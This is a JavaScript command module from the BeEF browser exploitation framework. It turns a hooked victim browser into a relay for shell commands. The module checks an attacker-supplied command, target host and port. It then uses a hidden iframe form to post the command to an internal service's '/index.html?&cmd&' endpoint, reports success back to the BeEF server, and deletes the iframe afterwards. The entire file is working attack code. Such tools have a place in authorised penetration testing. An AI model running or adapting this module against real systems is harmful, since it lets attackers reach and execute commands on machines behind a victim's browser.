//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	// validate payload
	try {
		var cmd = '<%= @commands.gsub(/'/, "\\\'").gsub(/"/, '\\\"') %>';
	} catch(e) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed payload: '+e.toString());
		return;
	}

	// validate target host
	var rhost = "<%= @rhost %>";
	if (!rhost) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target host');
		return;
	}

	// validate target port
	var rport = "<%= @rport %>";
	if (!rport || rport > 65535 || rport < 0 || isNaN(rport)) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');
		return;
	}

	// validate timeout
	var timeout = "<%= @timeout %>";
	if (isNaN(timeout)) timeout = 30;

	// send commands
	var win_ipec_form_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html?&cmd&", cmd + " & exit");
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Shell commands sent');

	// clean up
	cleanup = function() {
		document.body.removeChild(win_ipec_form_<%= @command_id %>);
	}
	setTimeout("cleanup()", timeout * 1000);

});

